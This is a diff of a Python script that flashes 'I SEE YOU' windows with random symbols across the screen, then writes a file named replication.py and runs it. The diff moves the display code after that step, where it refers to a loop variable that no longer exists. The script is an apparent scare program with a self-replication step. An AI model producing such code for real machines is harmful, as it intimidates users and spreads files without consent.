@@ -40,14 +40,6 @@ screen_height = root.winfo_screenheight()
 symbols_folder = "symbols/"
 
 
-for i in range(15):
-    symbol_path = os.path.join(symbols_folder, random.choice(os.listdir(symbols_folder)))
-    img = cv2.imread(symbol_path, cv2.IMREAD_ANYCOLOR)
-    cv2.imshow("I SEE YOU" + str(i), img)
-    cv2.moveWindow("I SEE YOU"+ str(i), random.randint(0, screen_width),random.randint(0, screen_height));
-    cv2.waitKey(800)
-    cv2.destroyWindow("I SEE YOU" + str(i-3))
-
 with open("replication.py", "w") as f:
     f.write('''
     import os
@@ -69,3 +61,11 @@ with open("replication.py", "w") as f:
     ''')
 
 subprocess.run(["python", "replication.py"])
+
+
+symbol_path = os.path.join(symbols_folder, random.choice(os.listdir(symbols_folder)))
+img = cv2.imread(symbol_path, cv2.IMREAD_ANYCOLOR)
+cv2.imshow("I SEE YOU" + str(i), img)
+cv2.moveWindow("I SEE YOU"+ str(i), random.randint(0, screen_width),random.randint(0, screen_height));
+cv2.waitKey(800)
+cv2.destroyWindow("I SEE YOU" + str(i-3))
